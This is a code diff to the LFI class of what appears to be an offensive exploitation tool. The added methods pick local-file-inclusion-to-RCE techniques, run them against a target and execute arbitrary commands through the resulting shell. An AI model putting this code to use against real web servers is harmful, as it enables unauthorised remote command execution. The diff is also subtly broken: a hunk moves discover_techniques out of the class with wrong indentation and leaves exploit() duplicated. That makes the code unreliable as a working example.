@@ -86,6 +86,61 @@ class LFI:
         if self.target:
             validate_url(self.target)
     
+    def discover_techniques(self):
+        return ["php_filters", "php_session"]
+
+
+    
+    def exploit(self):
+        """
+        Attempt to exploit the LFI vulnerability to achieve RCE.
+        
+        Returns:
+            True if successful, False otherwise
+        """
+        if not self._technique:
+            # If no technique was specified, try to find one that works
+            viable_techniques = self.discover_techniques()
+            for technique_name in viable_techniques:
+                self.technique_name = technique_name
+                try:
+                    self._init_technique()
+                    if self._technique.check():
+                        info(f"Technique '{technique_name}' appears viable, attempting exploitation")
+                        result = self._technique.exploit()
+                        if result:
+                            self.shell_path = self._technique.shell_path
+                            return True
+                except TechniqueError as e:
+                    logger.debug(f"Technique '{technique_name}' failed: {str(e)}")
+            
+            logger.error("All exploitation techniques failed")
+            return False
+        else:
+            # If a specific technique was requested, use only that one
+            if self._technique.check():
+                result = self._technique.exploit()
+                if result:
+                    self.shell_path = self._technique.shell_path
+                    return True
+            return False
+    def shell(self, command: str = None):
+        """
+        Execute commands via the established RCE shell.
+        
+        Args:
+            command: Command to execute (if None, will use self.custom_cmd or start an interactive shell)
+            
+        Returns:
+            Command output
+        """
+        if not self.shell_path:
+            if not self.exploit():
+                raise ElleEstFitError("Failed to establish a shell. Run exploit() first.")
+        
+        cmd = command or self.custom_cmd or "id"
+        return self._technique.execute(cmd)
+        
     def _init_technique(self):
         """Initialize the specified exploitation technique."""
         try:
@@ -115,16 +170,15 @@ class LFI:
         except (ImportError, AttributeError) as e:
             raise TechniqueError(f"Failed to load technique '{self.technique_name}': {str(e)}")
     
-    def discover_techniques(self):
-        """
-        Attempt to discover which LFI to RCE techniques might work.
-        
-        Returns:
-            List of technique names that might be viable
-        """
-        # This would try various techniques to see which ones might work
-        # For now, we'll return a placeholder
-        return ["php_filters", "log_poisoning"]
+def discover_techniques(self):
+    """
+    Attempt to discover which LFI to RCE techniques might work.
+    
+    Returns:
+        List of technique names that might be viable
+    """
+    # Try techniques in order of reliability and complexity
+    return ["php_filters", "php_session"]
     
     def exploit(self):
         """
